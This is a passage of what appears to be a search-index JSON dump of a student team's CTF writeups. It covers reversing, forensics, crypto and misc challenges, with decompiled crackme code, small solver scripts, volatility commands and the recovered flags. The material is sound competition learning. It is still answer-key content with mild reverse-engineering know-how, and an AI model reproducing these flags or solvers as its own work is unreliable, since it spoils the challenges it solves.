'bjB0dGg0dGVhNXk=' which when base64 decoded gives 'n0tth4tea5y'. The second TCP stream gives us a reversed zip file which after reversing back and using 'n0tth4tea5y' as the password gives us flag.txt.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/find/#flag","text":"shaktictf{g00d_lUcK_4_tH3_n3xT_cH411eNg3}","title":"Flag"},{"location":"ShaktiCTF21/forensics/follow/","text":"Follow Up Challenge Description We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret. Challenge Author v1Ru5 Short Writeup Just follow up the TCP stream to get the links for pastebin. The last link contains the real flag. Flag shaktictf{Th15_w4s_eA5Y!!}","title":"Follow Up"},{"location":"ShaktiCTF21/forensics/follow/#follow-up","text":"","title":"Follow Up"},{"location":"ShaktiCTF21/forensics/follow/#challenge-description","text":"We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/follow/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/follow/#short-writeup","text":"Just follow up the TCP stream to get the links for pastebin. The last link contains the real flag.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/follow/#flag","text":"shaktictf{Th15_w4s_eA5Y!!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/help/","text":"Help Me Challenge Description Our department had taken up the responsibility of solving a mysterious case but unfortunately our system crashed. We could only recover this memory dump. Your job is get all the important files from the system and use the files to find out the secret informatiom. Challenge Author v1Ru5 & bl4ck_Widw Short Writeup We use the tool 'volatility' for this challenge. This command gives us the first part. volatility -f Challenge.vmem --profile=Win7SP1x64 cmdscan Which on base64 decoded gives us 'shaktictf{H0p3'. volatility -f Challenge.vmem --profile=Win7SP1x64 filescan shows that there are two useful files Part II.png and L4ST.py.zip. Extract both the files. Apply 'zsteg' on the PNG image and we got the second part of the flag \" y0U_l1k3d \". The zip file has a python script which needs to be reversed. def tryin(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)+1)) elif(char.isupper()): result += chr((ord(char) - s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result def checkin(inp): for i in range(len(inp)): if(len(inp)<=7): Z.append(chr(ord(inp[i])-i+1)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) # Giving the input \"y>v<^xd::439064..y\" as the string from the challenge , gives us our input to be used: X=\"uh27bio:uY<xrA.\" s=4 y=[] Z=[] Y=[] k=[] X=checkin(X) y=tryin(X,s) print(\"input: \"+y) which gives the last part of the flag \"th15_ch4lL3ng3!}\" Flag shaktictf{H0p3_y0U_l1k3d_th15_ch4lL3ng3!}","title":"Help Me"},{"location":"ShaktiCTF21/forensics/help/#help-me","text":"","title":"Help Me"},{"location":"ShaktiCTF21/forensics/help/#challenge-description","text":"Our department had taken up the responsibility of solving a mysterious case but unfortunately our system crashed. We could only recover this memory dump. Your job is get all the important files from the system and use the files to find out the secret informatiom.","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/help/#challenge-author","text":"v1Ru5 & bl4ck_Widw","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/help/#short-writeup","text":"We use the tool 'volatility' for this challenge. This command gives us the first part. volatility -f Challenge.vmem --profile=Win7SP1x64 cmdscan Which on base64 decoded gives us 'shaktictf{H0p3'. volatility -f Challenge.vmem --profile=Win7SP1x64 filescan shows that there are two useful files Part II.png and L4ST.py.zip. Extract both the files. Apply 'zsteg' on the PNG image and we got the second part of the flag \" y0U_l1k3d \". The zip file has a python script which needs to be reversed. def tryin(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)+1)) elif(char.isupper()): result += chr((ord(char) - s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result def checkin(inp): for i in range(len(inp)): if(len(inp)<=7): Z.append(chr(ord(inp[i])-i+1)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) # Giving the input \"y>v<^xd::439064..y\" as the string from the challenge , gives us our input to be used: X=\"uh27bio:uY<xrA.\" s=4 y=[] Z=[] Y=[] k=[] X=checkin(X) y=tryin(X,s) print(\"input: \"+y) which gives the last part of the flag \"th15_ch4lL3ng3!}\"","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/help/#flag","text":"shaktictf{H0p3_y0U_l1k3d_th15_ch4lL3ng3!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Follow Up Very Easy v1Ru5 Network Delete Easy v1Ru5 File Chunkies Easy v1Ru5 File Find Me Medium v1Ru5 Network Help Me Hard v1Ru5 & Memory bl4ck_Widw","title":"Forensics"},{"location":"ShaktiCTF21/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Follow Up Very Easy v1Ru5 Network Delete Easy v1Ru5 File Chunkies Easy v1Ru5 File Find Me Medium v1Ru5 Network Help Me Hard v1Ru5 & Memory bl4ck_Widw","title":"Forensics"},{"location":"ShaktiCTF21/misc/intro/","text":"","title":"Intro"},{"location":"ShaktiCTF21/pwn/intro/","text":"","title":"Intro"},{"location":"ShaktiCTF21/reversing/Margaret/","text":"Author Simran Sandra Challenge Short Writeup The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver. Solver result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag) Flag shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Margaret"},{"location":"ShaktiCTF21/reversing/Margaret/#author","text":"Simran Sandra","title":"Author"},{"location":"ShaktiCTF21/reversing/Margaret/#challenge-short-writeup","text":"The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver.","title":"Challenge Short Writeup"},{"location":"ShaktiCTF21/reversing/Margaret/#solver","text":"result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag)","title":"Solver"},{"location":"ShaktiCTF21/reversing/Margaret/#flag","text":"shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Flag"},{"location":"ShaktiCTF21/reversing/deceev/","text":"Deceev Challenge Writeup This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2] Flag shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Deceev"},{"location":"ShaktiCTF21/reversing/deceev/#deceev","text":"","title":"Deceev"},{"location":"ShaktiCTF21/reversing/deceev/#challenge-writeup","text":"This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2]","title":"Challenge Writeup"},{"location":"ShaktiCTF21/reversing/deceev/#flag","text":"shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Flag"},{"location":"ShaktiCTF21/reversing/fusk/","text":"Fusk Challenge Concept Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7) Flag flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Fusk"},{"location":"ShaktiCTF21/reversing/fusk/#fusk","text":"","title":"Fusk"},{"location":"ShaktiCTF21/reversing/fusk/#challenge-concept","text":"Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7)","title":"Challenge Concept"},{"location":"ShaktiCTF21/reversing/fusk/#flag","text":"flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Flag"},{"location":"ShaktiCTF21/reversing/intro/","text":"Reversing Challenge Name Level Author Concept deceev Medium Sandrabeme base64 fusk Easy Sandrabeme recursive function reversing MargaREt Hard Sandrabeme GoVM","title":"Reversing"},{"location":"ShaktiCTF21/reversing/intro/#reversing","text":"Challenge Name Level Author Concept deceev Medium Sandrabeme base64 fusk Easy Sandrabeme recursive function reversing MargaREt Hard Sandrabeme GoVM","title":"Reversing"},{"location":"ShaktiCTF21/web/intro/","text":"","title":"Intro"},{"location":"crypto/intro/","text":"Cryptography Introduction \"Write about Crypto and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. BlueHensCTF hot-diggity-dog - Arya Arun OTP-1 - Pavani","title":"Cryptography"},{"location":"crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"crypto/intro/#introduction","text":"\"Write about Crypto and about the writeups\"","title":"Introduction"},{"location":"crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. BlueHensCTF hot-diggity-dog - Arya Arun OTP-1 - Pavani","title":"The contents of this repo"},{"location":"crypto/BlueHensCTF/OTP-1/","text":"OTP-1 Description Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. OTP-1 FILE (https://bluehens.ctfd.io/files/bcd960c240bc8ccd7ccf46d0c85095e4/otp1.php?token=eyJ1c2VyX2lkIjoyODMsInRlYW1faWQiOjIwMiwiZmlsZV9pZCI6Mzd9.YGG65Q.0NwTirE69YCv7yyLSx-X-1t3Iyo) In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly. Flag= UDCTF{w3lcome_t0_0ur_ctf}","title":"OTP-1"},{"location":"crypto/BlueHensCTF/OTP-1/#otp-1","text":"","title":"OTP-1"},{"location":"crypto/BlueHensCTF/OTP-1/#description","text":"Sloved By: Pavani (@Paavani15793872) Here we have an intersting challenge which involves brute forcing. OTP-1 FILE (https://bluehens.ctfd.io/files/bcd960c240bc8ccd7ccf46d0c85095e4/otp1.php?token=eyJ1c2VyX2lkIjoyODMsInRlYW1faWQiOjIwMiwiZmlsZV9pZCI6Mzd9.YGG65Q.0NwTirE69YCv7yyLSx-X-1t3Iyo) In the given file, code is given in php Here we have two cipher texts, which are separated by @@ from this we can tell that all characters are uppercase letters. repeated xor : Here we have two cipher texts, try to built a code which allows uppercase letters and xor cipher texts and flag. till now we know that the flag = \"UDCTF{\" (with length = 6) Try to guess letters one by one and xor it with cipher texts accordingly.","title":"Description"},{"location":"crypto/BlueHensCTF/OTP-1/#flag-udctfw3lcome_t0_0ur_ctf","text":"","title":"Flag= UDCTF{w3lcome_t0_0ur_ctf}"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/","text":"BlueHens CTF Hot-diggity-dog hot-diggity-dog.py output.txt On observing the files, we find that it is a cryptographic attack- 'Wiener's attack' And we found a script online to decrpyt it. Substituting our values and running it, directly gives us the flag.. UDCTF{5t1ck_t0_65537}","title":"BlueHens CTF"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"crypto/BlueHensCTF/hot-diggity-dog/#hot-diggity-dog","text":"hot-diggity-dog.py output.txt On observing the files, we find that it is a cryptographic attack- 'Wiener's attack' And we found a script online to decrpyt it. Substituting our values and running it, directly gives us the flag.. UDCTF{5t1ck_t0_65537}","title":"Hot-diggity-dog"},{"location":"forensics/intro/","text":"Forensics Introduction \"Write about Forensics and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Forensics"},{"location":"forensics/intro/#forensics","text":"","title":"Forensics"},{"location":"forensics/intro/#introduction","text":"\"Write about Forensics and about the writeups\"","title":"Introduction"},{"location":"forensics/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"forensics/DarkCTF/Knot-65/Knot/","text":"Knot-65 Description Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password. Solution So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open(\"file.txt\",\"r\") r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#knot-65","text":"","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#description","text":"Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password.","title":"Description"},{"location":"forensics/DarkCTF/Knot-65/Knot/#solution","text":"So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open(\"file.txt\",\"r\") r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Solution"},{"location":"forensics/DarkCTF/Powershell/Powershell/","text":"PowerShell Solved by : Sridevi Description I want to know what is happening in my Windows Powershell. Solution We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#powershell","text":"Solved by : Sridevi","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#description","text":"I want to know what is happening in my Windows Powershell.","title":"Description"},{"location":"forensics/DarkCTF/Powershell/Powershell/#solution","text":"We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"Solution"},{"location":"forensics/TJCTF/Rap%20God/Rap/","text":"Rap Goad Solved by : Sridevi Description My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message} Solution Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Rap Goad"},{"location":"forensics/TJCTF/Rap%20God/Rap/#rap-goad","text":"Solved by : Sridevi","title":"Rap Goad"},{"location":"forensics/TJCTF/Rap%20God/Rap/#description","text":"My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message}","title":"Description"},{"location":"forensics/TJCTF/Rap%20God/Rap/#solution","text":"Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Solution"},{"location":"misc/intro/","text":"Miscellaneous Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category. The contents of this repo This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis - Sandhra Bino BlueHensCTF 2021 Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha","title":"Miscellaneous"},{"location":"misc/intro/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"misc/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category.","title":"Introduction"},{"location":"misc/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis - Sandhra Bino BlueHensCTF 2021 Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha","title":"The contents of this repo"},{"location":"misc/BlueHensCTF/Conway/conway/","text":"BlueHens CTF Conway presents the falcon - Misc Challenge file On browsing about rle files Found an online decoder Importing the file into it, we directly get the flag.. UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Conway/conway/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Conway/conway/#conway-presents-the-falcon-misc","text":"Challenge file On browsing about rle files Found an online decoder Importing the file into it, we directly get the flag.. UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}","title":"Conway presents the falcon - Misc"},{"location":"misc/BlueHensCTF/Mountain%20Climber/Mountain_climber/","text":"BlueHens CTF Mountain climber On opening the given image we can find different blocks. - First block: Granite - Second block: Block of Emerald - Third block: Target - Fourth block: Birch log - Fifth block: Loom - Sixth block: Obsidian - Seventh block: Chest - Eight block: Dried kelp block - Ninth block: Block of Emerald - Tenth block: Diorite After trying different ways our flag is first letter of all names. Flag: UDCTF{GETBLOCKED} Names of different blocks in minicraft","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Mountain%20Climber/Mountain_climber/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Mountain%20Climber/Mountain_climber/#mountain-climber","text":"On opening the given image we can find different blocks. - First block: Granite - Second block: Block of Emerald - Third block: Target - Fourth block: Birch log - Fifth block: Loom - Sixth block: Obsidian - Seventh block: Chest - Eight block: Dried kelp block - Ninth block: Block of Emerald - Tenth block: Diorite After trying different ways our flag is first letter of all names. Flag: UDCTF{GETBLOCKED} Names of different blocks in minicraft","title":"Mountain climber"},{"location":"misc/BlueHensCTF/Rise%20%26%20Shine/rise/","text":"DESCRIPTION Breakfast is the most important meal of the day. Wrap your result in UDCTF{} all caps. HINT: it is one common english word encoded in Baconian SOLUTION It's Baconian cipher. There are 40 stars, of 2 types, along the boundary of the image. When we take those in anti-clockwise order, we will get the baconian \"AAABAAABBBAAAAAABABBABBBAABAAAABBABABBAA\". This can de decoded to \"CHAMPION\". FLAG UDCTF{CHAMPION}","title":"Rise"},{"location":"misc/BlueHensCTF/Rise%20%26%20Shine/rise/#description","text":"Breakfast is the most important meal of the day. Wrap your result in UDCTF{} all caps. HINT: it is one common english word encoded in Baconian","title":"DESCRIPTION"},{"location":"misc/BlueHensCTF/Rise%20%26%20Shine/rise/#solution","text":"It's Baconian cipher. There are 40 stars, of 2 types, along the boundary of the image. When we take those in anti-clockwise order, we will get the baconian \"AAABAAABBBAAAAAABABBABBBAABAAAABBABABBAA\". This can de decoded to \"CHAMPION\".","title":"SOLUTION"},{"location":"misc/BlueHensCTF/Rise%20%26%20Shine/rise/#flag","text":"UDCTF{CHAMPION}","title":"FLAG"},{"location":"misc/BlueHensCTF/Transforms/Transforms/","text":"Challenge name: Transforms Convert me! nc challenges.ctfd.io 30008 We have to do 100 conversion correctly. For example: convert bytearray to hexdigest: [129, 141, 112, 176, 251, 106, 160, 102] @@@@@ convert integer to bytearray: 1639309969325418938 @@@@@ convert bytearray to integer: [55, 107, 189, 150, 85, 213, 147, 94] @@@@@ and so on import binascii from pwn import * 